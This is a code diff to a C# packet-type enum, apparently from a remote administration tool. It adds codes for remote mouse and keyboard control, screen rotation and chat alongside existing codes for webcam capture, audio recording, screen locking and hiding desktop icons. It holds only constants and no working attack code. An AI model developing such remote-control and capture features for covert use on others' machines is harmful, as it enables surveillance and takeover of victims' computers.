@@ -59,9 +59,12 @@ namespace PacketLib.Packet
         MISC_SCREENLOCKER_OFF =         45,
         MISC_HIDE_DESKTOP_ICONS =       49,
         MISC_SHOW_DESKTOP_ICONS =       50,
+        MISC_SCREEN_ROTATION =          61,
 
         RM_VIEW_ON =                    34,
         RM_VIEW_OFF =                   35,
+        RM_MOUSE =                      59,
+        RM_KEYBOARD =                   60,
 
         RC_GET_CAM =                    36,
         RC_CAPTURE_ON =                 37,
@@ -78,5 +81,8 @@ namespace PacketLib.Packet
         AUDIO_GET_DEVICES =             55,
         AUDIO_RECORD_ON =               56,
         AUDIO_RECORD_OFF =              57,
+
+        CHAT_ON =                       62,
+        CHAT_OFF =                      63
     }
 }
